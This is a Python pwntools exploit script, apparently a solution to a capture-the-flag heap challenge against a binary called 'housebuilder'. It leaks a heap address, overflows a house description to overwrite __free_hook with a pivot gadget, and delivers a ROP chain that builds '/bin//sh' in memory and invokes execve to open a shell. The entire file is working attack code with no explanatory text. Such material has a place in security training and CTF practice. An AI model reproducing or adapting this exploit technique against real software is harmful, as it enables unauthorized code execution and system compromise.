from pwn import *


io = process('./housebuilder')
elf = ELF('./housebuilder')

def create(name, rooms, floors, peoples):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'1')
    print(io.recv())
    io.sendline(name)
    print(io.recv())
    io.sendline(str(rooms))
    print(io.recv())
    io.sendline(str(floors))
    print(io.recv())
    io.sendline(str(peoples))

def describe(index, description):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(str(index))
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(description)
    print(io.recvuntil(b'> '))
    io.sendline(b'4')

def sell(index):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(str(index))
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'> '))
    io.sendline(b'4')

def exploit(index, description):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(str(index))
    print(io.recvuntil(b'> '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(description)
    print(io.recvuntil(b'> '))
    io.interactive()
    io.sendline(b'3')

def leak(index):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'2')
    print(io.recv())
    io.sendline(str(index))
    print(io.recvuntil(b'> '))
    io.sendline(b'3')
    print(io.recvuntil(b'> '))
    io.sendline(b'1')
    print(io.recvuntil(b'Floors: '))
    global heapbase
    heapbase = int(io.recvline())
    print(io.recvuntil(b'> '))
    io.sendline(b'4')

def erase(index):
    print(io.recvuntil(b'{$} > '))
    io.sendline(b'4')
    print(io.recv())
    io.sendline(str(index))



create(b'A',1,1,1)
create(b'B',1,1,1)
create(b'C',1,1,1)
create(b'D',1,1,1)

leak(0)
log.info('Heapbase: '+hex(heapbase))
payload = b'A'*0x408+p64(0x51)+p64(0)*3+p64(heapbase+82664)+p64(1)+p64(0x43)+p64(0)+p64(elf.sym['__free_hook'])
describe(1, payload)
# p64(0x488225) --- mov rax, qword ptr [rdi] ; mov dword ptr [rsp], ecx ; call qword ptr [rax + 0x48]
describe(2, p64(0x488225))
pause()


current = heapbase+0x14770

payload = p64(current+0x200)

payload += p64(0x407668) # pop rsi ; ret
payload += p64(0x5d4000) # @ .data
payload += p64(0x41fcba) # pop rax ; ret
payload += b'/bin//sh'
payload += p64(0x418965) # mov qword ptr [rsi], rax ; ret
payload += p64(0x407668) # pop rsi ; ret
payload += p64(0x5d4008) # @ .data + 8
payload += p64(0x513499) # xor rax, rax ; ret
payload += p64(0x418965) # mov qword ptr [rsi], rax ; ret
payload += p64(0x41432a) # pop rdi ; pop rbp ; ret
payload += p64(0x5d4000) # @ .data
payload += p64(0)
payload += p64(0x407668) # pop rsi ; ret
payload += p64(0x5d4008) # @ .data + 8
payload += p64(0x4044cf) # pop rdx ; ret
payload += p64(0x5d4008) # @ .data + 8
payload += p64(0x513499) # xor rax, rax ; ret
payload += p64(0x41fcba) # pop rax ; ret
payload += p64(59)
payload += p64(0x403c73) # syscall
off = len(payload)
payload += b'A'*(0x200-off)
payload += b'A'*0x8
payload += p64(0x40525f) # pop rsp ; pop rbp ; ret
payload += p64(current)
payload += p64(0)
payload += b'A'*0x20

payload += p64(0x404e9f) # leave ; ret
payload += p64(0x44564e) # mov rbp, rax ; mov rax, qword ptr [rdi] ; call qword ptr [rax + 0x40]

describe(3, payload)
erase(3)
io.interactive()
